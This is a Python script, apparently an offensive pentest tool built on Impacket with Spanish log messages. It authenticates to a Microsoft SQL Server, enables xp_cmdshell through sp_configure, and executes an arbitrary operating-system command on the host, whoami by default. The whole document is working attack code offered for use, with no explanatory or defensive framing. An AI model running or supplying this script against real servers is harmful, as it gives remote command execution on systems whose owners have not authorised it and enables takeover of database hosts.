import sys
import logging
import argparse
from impacket.examples import logger
from impacket.examples.mssqlshell import SQLSHELL
from impacket.examples.utils import parse_target
from impacket import tds, version

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

def habilitar_xp_cmdshell(mssql):
    try:
        logging.info("Habilitando xp_cmdshell...")
        mssql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
        mssql.sql_query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
        logging.info("xp_cmdshell habilitado con éxito.")
    except Exception as e:
        logging.error(f"Error al habilitar xp_cmdshell: {e}")

def ejecutar_comando(mssql, comando):
    try:
        logging.info(f"Ejecutando comando: {comando}")
        mssql.sql_query(f"EXEC xp_cmdshell '{comando}';")
        rows = mssql.printRows()
        return rows
    except Exception as e:
        logging.error(f"Error al ejecutar comando: {e}")

def main():
    parser = argparse.ArgumentParser(description="Cliente automatizado de Impacket para MSSQL")
    parser.add_argument('target', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-port', default='1433', help='Puerto MSSQL (default 1433)')
    parser.add_argument('-cmd', default='whoami', help='Comando a ejecutar con xp_cmdshell')
    
    args = parser.parse_args()
    domain, username, password, remoteName = parse_target(args.target)

    try:
        logging.info(f"Conectando a la base de datos en {remoteName} como {username}...")
        ms_sql = tds.MSSQL(remoteName, int(args.port))
        ms_sql.connect()
        
        res = ms_sql.login(None, username, password, domain)
        ms_sql.printReplies()
        
        if res:
            habilitar_xp_cmdshell(ms_sql)
            resultado = ejecutar_comando(ms_sql, args.cmd)
            if resultado:
                print(resultado)
        
        ms_sql.disconnect()
        logging.info("Conexión cerrada.")

    except KeyboardInterrupt:
        logging.warning("Interrupción detectada. Cerrando conexión...")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Error de conexión: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
